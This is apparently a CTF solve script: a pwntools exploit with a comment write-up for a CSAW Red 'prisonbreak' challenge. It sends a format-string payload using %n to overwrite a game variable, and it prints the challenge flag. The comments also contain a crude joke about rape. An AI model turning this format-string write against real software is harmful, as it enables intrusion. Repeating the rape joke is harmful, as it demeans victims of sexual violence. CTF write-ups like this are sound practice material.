#!/usr/bin/env python3

############################### Write-Up #######################################
# Points: 125 (22 hrs in)
# Category: pwn
# Prompt: Roll a natural 20 to escape from Profion's dungeon!
# nc pwn.red.csaw.io 5004
#
# Ok I finally get redemption for solving the dead-canary chall for redpwnCTF!
# I was stuck for a couple of hours at first, think that this chall was like
# some bof to overwrite the variable roll_value, hoever looking at the src code
# it's obv it would not work since you are limited to writing 20 bytes. Then,
# I spotted a vulnerable printf() statement, and then I realised that I should
# make an arbitrary write to an address. It first I thought that I should
# overwrite on address in GOT to call win(), but then I found that I could do
# something easier: overwrite the roll_value var so that it is 20. Then, after
# a an extra hour of debugging in the morning, I got the nat 20.
# Imagine raping someone after rolling a nat 20 eh?
#
# Flag: flag{Y0u_s41d_th3_wr1t3_th1ng}
# Solved by: Ryan Nguyen

from pwn import *

exe = ELF("prisonbreak")

context.binary = exe
#context.log_level = 'debug'

def conn():
	if False:
		return process([exe.path])
	else:
		return remote("pwn.red.csaw.io", 5004)


def main():
	r = conn()
	r.recvuntil(">")
	r.sendline("aaaa%16x%8$naaaa\xac\x20\x60\x00")
	#gdb.attach(r, '''
	#x 0x6020ac
	#b puts
	#''')
	r.interactive()


if __name__ == "__main__":
	main()
